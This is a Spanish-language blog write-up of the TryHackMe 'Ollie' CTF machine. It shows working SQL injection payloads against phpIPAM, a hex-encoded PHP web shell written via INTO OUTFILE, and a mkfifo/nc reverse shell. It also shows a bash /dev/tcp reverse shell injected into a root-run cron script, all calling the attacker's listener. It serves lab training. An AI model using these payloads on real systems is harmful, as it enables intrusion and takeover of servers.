<!doctype html><html lang=es><head><title>Ollie - Write Up ::
Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Medio 0day    Reconocimiento ¡Hey! ¡Bienvenido de nuevo a otra máquina TryHackMe!
¡Hoy estamos armando otra máquina 0day!
Como en toda máquina, ¡comezamos con la fase de reconocimiento!
╰─ map 10.10.229.233 ─╯ Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-09 12:59 CEST Nmap scan report for 10."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/ollie/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/ollie/cover.jpeg"><meta name=twitter:title content="Ollie - Write Up"><meta name=twitter:description content="Máquina de nivel medio en TryHackMe."><meta property="og:title" content="Ollie - Write Up"><meta property="og:description" content="Máquina de nivel medio en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/ollie/"><meta property="og:image" content="/es/posts/ollie/cover.jpeg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-09T16:33:48+02:00"><meta property="article:modified_time" content="2022-04-09T16:33:48+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span></a>
<span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Ollie - Write Up</h1><div class=post-meta><span class=post-date>2022-04-09</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 6 mins lectura</span></div><span class=post-tags><a href=/tags/cve/>#CVE</a>&nbsp;
<a href=/tags/sqli/>#SQLI</a>&nbsp;
<a href=/tags/rce/>#RCE</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/ollie/cover.jpeg alt="Ollie - Write Up"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/ollie>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/0day>0day</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>¡Hey! ¡Bienvenido de nuevo a otra máquina TryHackMe!</p><p>¡Hoy estamos armando otra máquina <a href=https://tryhackme.com/p/0day>0day</a>!</p><p>Como en toda máquina, ¡comezamos con la fase de reconocimiento!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ map 10.10.229.233                                                                          ─╯
</span></span><span style=display:flex><span>Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-04-09 12:59 CEST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.229.233
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.76s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>37078</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>, <span style=color:#ae81ff>28454</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1337/tcp open  waste?
</span></span><span style=display:flex><span>| fingerprint-strings:
</span></span><span style=display:flex><span>|   GenericLines:
</span></span><span style=display:flex><span>|     Hey stranger, I<span style=color:#e6db74>&#39;m Ollie, protector of panels, lover of deer antlers.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     What is your name? What&#39;</span>s up,
</span></span><span style=display:flex><span>|     It<span style=color:#e6db74>&#39;s been a while. What are you here for?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   GetRequest:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Hey stranger, I&#39;</span>m Ollie, protector of panels, lover of deer antlers.
</span></span><span style=display:flex><span>|     What is your name? What<span style=color:#e6db74>&#39;s up, Get / http/1.0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     It&#39;</span>s been a <span style=color:#66d9ef>while</span>. What are you here <span style=color:#66d9ef>for</span>?
</span></span><span style=display:flex><span>|   NULL:
</span></span><span style=display:flex><span>|     Hey stranger, I<span style=color:#e6db74>&#39;m Ollie, protector of panels, lover of deer antlers.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_    What is your name?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF-Port1337-TCP:V=7.92%I=7%D=4/9%Time=625192C6%P=x86_64-apple-darwin21.1.0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:%r(NULL,59,&#34;Hey\x20stranger,\x20I&#39;</span>m<span style=color:#ae81ff>\x</span>20Ollie,<span style=color:#ae81ff>\x</span>20protector<span style=color:#ae81ff>\x</span>20of<span style=color:#ae81ff>\x</span>20pan
</span></span><span style=display:flex><span>SF:els,<span style=color:#ae81ff>\x</span>20lover<span style=color:#ae81ff>\x</span>20of<span style=color:#ae81ff>\x</span>20deer<span style=color:#ae81ff>\x</span>20antlers<span style=color:#ae81ff>\.\n\n</span>What<span style=color:#ae81ff>\x</span>20is<span style=color:#ae81ff>\x</span>20your<span style=color:#ae81ff>\x</span>20name<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>SF:?<span style=color:#ae81ff>\x</span>20<span style=color:#e6db74>&#34;)%r(GenericLines,93,&#34;</span>Hey<span style=color:#ae81ff>\x</span>20stranger,<span style=color:#ae81ff>\x</span>20I<span style=color:#e6db74>&#39;m\x20Ollie,\x20protect
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:or\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20your\x20name\?\x20What&#39;</span>s<span style=color:#ae81ff>\x</span>20up,<span style=color:#ae81ff>\x</span>20<span style=color:#ae81ff>\r\n\r</span>!<span style=color:#ae81ff>\x</span>20It<span style=color:#e6db74>&#39;s\x20been\x20a\x20wh
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ile\.\x20What\x20are\x20you\x20here\x20for\?\x20&#34;)%r(GetRequest,A1,&#34;Hey
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\x20stranger,\x20I&#39;</span>m<span style=color:#ae81ff>\x</span>20Ollie,<span style=color:#ae81ff>\x</span>20protector<span style=color:#ae81ff>\x</span>20of<span style=color:#ae81ff>\x</span>20panels,<span style=color:#ae81ff>\x</span>20lover<span style=color:#ae81ff>\x</span>
</span></span><span style=display:flex><span>SF:20of<span style=color:#ae81ff>\x</span>20deer<span style=color:#ae81ff>\x</span>20antlers<span style=color:#ae81ff>\.\n\n</span>What<span style=color:#ae81ff>\x</span>20is<span style=color:#ae81ff>\x</span>20your<span style=color:#ae81ff>\x</span>20name<span style=color:#ae81ff>\?\x</span>20What<span style=color:#e6db74>&#39;s\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:up,\x20Get\x20/\x20http/1\.0\r\n\r!\x20It&#39;</span>s<span style=color:#ae81ff>\x</span>20been<span style=color:#ae81ff>\x</span>20a<span style=color:#ae81ff>\x</span>20while<span style=color:#ae81ff>\.\x</span><span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>SF:What<span style=color:#ae81ff>\x</span>20are<span style=color:#ae81ff>\x</span>20you<span style=color:#ae81ff>\x</span>20here<span style=color:#ae81ff>\x</span>20for<span style=color:#ae81ff>\?\x</span>20<span style=color:#e6db74>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Nmap done: 1 IP address (1 host up) scanned in 284.81 seconds
</span></span></span></code></pre></div><p>Hay un servicio extraño ejecutándose en el puerto <code>1337</code> (Leet :D). Es un puerto común utilizado en CTF y por pentesters, ya que hace referencia a <a href=https://es.wikipedia.org/wiki/Leet>Leet speak</a></p><p>Usemos <code>nc</code> para conectarnos a este puerto&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ nc 10.10.229.233 <span style=color:#ae81ff>1337</span>                                                                    ─╯
</span></span><span style=display:flex><span>Hey stranger, I<span style=color:#e6db74>&#39;m Ollie, protector of panels, lover of deer antlers.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>What is your name? ollie
</span></span></span><span style=display:flex><span><span style=color:#e6db74>What&#39;</span>s up, Ollie! It<span style=color:#e6db74>&#39;s been a while. What are you here for? exploit
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Ya&#39;</span> know what? Ollie. If you can answer a question about me, I might have something <span style=color:#66d9ef>for</span> you.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>What breed of dog am I? I<span style=color:#e6db74>&#39;ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? bulldog
</span></span></span><span style=display:flex><span><span style=color:#e6db74>You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Please hold on a minute
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Ok, I&#39;</span>m back.
</span></span><span style=display:flex><span>After a lengthy discussion, we<span style=color:#960050;background-color:#1e0010>&#39;</span>ve come to the conclusion that you are the right person <span style=color:#66d9ef>for</span> the job.Here are the credentials <span style=color:#66d9ef>for</span> our administration panel.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    Username: admin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    Password: <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS: Good luck and next time bring some treats!
</span></span></code></pre></div><p>¡Wow! ¡Parece que Ollie acaba de darnos sus credenciales del panel de administrador!</p><p>¡Iniciemos sesión!</p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Entonces, después de una (<em>larga</em>) fase de reconocimiento, encontramos que la plataforma que se ejecuta es <code>phpIPAM IP address management [v1.4.5]</code></p><p>El problema aquí es que hay un exploit para la versión anterior (1.4.4) de este software donde afirman que este problema se solucionó en la última versión&mldr;</p><p>Bien&mldr;</p><p><em>Spoiler: parece que no lo está</em></p><p>Este es el POC del exploit que usamos como guía: <a href=https://fluidattacks.com/advisories/mercury/>https://fluidattacks.com/advisories/mercury/</a></p><p>Básicamente necesitamos hacer una búsqueda al mapear una nueva subred, para explotar una <code>Inyección SQL</code>.</p><p><img src=howto.png alt=howto></p><p>Este es el exploit utilizado para probar si es vulnerable o no:</p><p><code>" union select @@version,2,user(),4 -- -</code></p><p>Lo usamos aquí y obtuvimos esta respuesta:
<img src=user_version.png alt=user_version></p><p>Como puede ver, podemos explotar un <code>SQLI</code> aquí, y tenemos la versión y el usuario que ejecuta la base de datos.</p><p><code>8.0.28-0ubuntu0.20.04.3/phpipam_ollie@localhost (4)</code></p><p>¡Cool! ¡Hagamos más reconocimiento manual dentro de la base de datos, veamos si nuestro usuario <code>phpipam_ollie</code> puede escribir un archivo!</p><p><img src=privs.png alt=privs>
Explotación utilizado:
<code>" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -</code></p><p><code>ollie_mysql:Y,phpipam_ollie:Y</code></p><p>¡Sí! ¡El usuario puede escribir archivos!</p><p>Entonces, para explotar esto, codificamos un payload de PHP simple en HEX:</p><p><code>&lt;?php system($_GET["cmd"]); ?></code></p><p>Y lo agregamos a nuestro exploit:</p><p><code>" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -</code></p><p><img src=shell_upload.png alt=shell_upload></p><p>Nos salió un error, pero veamos si se subió&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ curl http://10.10.229.233/shell.php<span style=color:#ae81ff>\?</span>cmd<span style=color:#ae81ff>\=</span>whoami                                             ─╯
</span></span><span style=display:flex><span>1	 www-data
</span></span><span style=display:flex><span> 	3	<span style=color:#ae81ff>4</span>
</span></span></code></pre></div><p>¡Sí! ¡Ahora pasamos de <code>SQLI</code> a <code>RCE</code>!</p><p>¡Establezcamos una <code>conexión de shell reversa</code> y comencemos la fase de reconocimiento nuevamente para llegar a <code>root</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>Terminal 1<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>╰─ curl http://10.10.229.233/shell.php<span style=color:#ae81ff>\?</span>cmd<span style=color:#ae81ff>\=</span>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.0.244%201337%20%3E%2Ftmp%2Ff
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Terminal 2<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>╰─ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                ─╯
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.0.244<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.229.233<span style=color:#f92672>]</span> <span style=color:#ae81ff>43490</span>
</span></span><span style=display:flex><span>sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
</span></span><span style=display:flex><span>$ id; whoami; pwd; hostname
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>www-data
</span></span><span style=display:flex><span>/var/www/html
</span></span><span style=display:flex><span>hackerdog
</span></span></code></pre></div><p>¡Estamos dentro! Pero no podemos leer la bandera de usuario, ya que <code>Ollie</code> es el propietario y estamos ejecutando como <code>www-data</code>.</p><p>Probemos la forma más fácil de subir privilegios: ¡ataque de reutilización de contraseñas!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@hackerdog:/var$ su ollie
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>ollie@hackerdog:/var$ cat /home/ollie/user.txt
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>¡Sí, funcionó! Ollie usa la misma contraseña para el servidor y el panel de administración.</p><h2 id=root>Root</h2><p>Para encontrar nuestro camino a root, necesitamos enumerar la máquina una vez más, usamos <code>LinPeas</code> pero nada nos llamó la atención, tambien usamos <code>pspy64</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ollie@hackerdog:/tmp$ ./pspy64
</span></span><span style=display:flex><span>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     ██▓███    ██████  ██▓███ ▓██   ██▓
</span></span><span style=display:flex><span>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
</span></span><span style=display:flex><span>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
</span></span><span style=display:flex><span>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
</span></span><span style=display:flex><span>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
</span></span><span style=display:flex><span>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
</span></span><span style=display:flex><span>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
</span></span><span style=display:flex><span>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
</span></span><span style=display:flex><span>                   ░           ░ ░
</span></span><span style=display:flex><span>                               ░ ░
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Config: Printing events <span style=color:#f92672>(</span>colored<span style=color:#f92672>=</span>true<span style=color:#f92672>)</span>: processes<span style=color:#f92672>=</span>true | file-system-events<span style=color:#f92672>=</span>false <span style=color:#f92672>||</span>| Scannning <span style=color:#66d9ef>for</span> processes every 100ms and on inotify events <span style=color:#f92672>||</span>| Watching directories: <span style=color:#f92672>[</span>/usr /tmp /etc /home /var /opt<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>recursive<span style=color:#f92672>)</span> | <span style=color:#f92672>[]</span> <span style=color:#f92672>(</span>non-recursive<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Draining file system events due to startup...
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>2022/04/09 12:29:51 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>97</span>     |
</span></span><span style=display:flex><span>2022/04/09 12:29:51 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>96</span>     |
</span></span><span style=display:flex><span>2022/04/09 12:29:51 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>959</span>    | /usr/bin/dockerd -H fd:// --containerd<span style=color:#f92672>=</span>/run/containerd/containerd.sock
</span></span><span style=display:flex><span>2022/04/09 12:29:51 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>113</span>  PID<span style=color:#f92672>=</span><span style=color:#ae81ff>950</span>    | /usr/sbin/mysqld
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4253</span>   | /lib/systemd/systemd-udevd
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4252</span>   | /lib/systemd/systemd-udevd
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4251</span>   | /lib/systemd/systemd-udevd
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4250</span>   | /lib/systemd/systemd-udevd
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4259</span>   | /lib/systemd/systemd-udevd
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4261</span>   | /bin/bash /usr/bin/feedme    &lt;------
</span></span><span style=display:flex><span>2022/04/09 12:30:03 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>4262</span>   | /bin/bash /usr/bin/feedme	&lt;------
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Y como puede ver, hay un binario extraño ejecutándose como root (<code>UID=0</code>) con algún cron o algo así</p><p>Vamos a ver qué pasa con eso&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ollie@hackerdog:/tmp$ ls -la /usr/bin/feedme
</span></span><span style=display:flex><span>-rwxrw-r-- <span style=color:#ae81ff>1</span> root ollie <span style=color:#ae81ff>180</span> Apr  <span style=color:#ae81ff>9</span> 12:20 /usr/bin/feedme
</span></span><span style=display:flex><span>ollie@hackerdog:/tmp$ cat /usr/bin/feedme
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># This is weird?</span>
</span></span></code></pre></div><p>¡Sí, es raro!</p><p>Parece un binario <code>propiedad de root</code>, pero con el grupo de <code>ollie</code> por lo que tenemos permisos de lectura y escritura.</p><p>¡Agreguémosle un exploit, para que podamos tener una <code>conexión de shell reversa</code> como <code>root</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ollie@hackerdog:~$ vim /usr/bin/feedme
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># This is weird?</span>
</span></span><span style=display:flex><span>/bin/bash -i &gt;&amp; /dev/tcp/10.9.0.244/1338 0&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;/usr/bin/feedme&#34;</span> 3L, 81C written
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ollie@hackerdog:~$ cat /usr/bin/feedme
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># This is weird?</span>
</span></span><span style=display:flex><span>/bin/bash -i &gt;&amp; /dev/tcp/10.9.0.244/1338 0&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>¡Configuremos <code>nc</code> en escucha y esperemos la conexión!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $nc -nlvp <span style=color:#ae81ff>1338</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1338</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.0.244<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.229.233<span style=color:#f92672>]</span> <span style=color:#ae81ff>51578</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>4090<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>root@hackerdog:~# id; whoami; hostname; cat /root/root.txt
</span></span><span style=display:flex><span>id; whoami; hostname; cat /root/root.txt
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>hackerdog
</span></span><span style=display:flex><span>THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
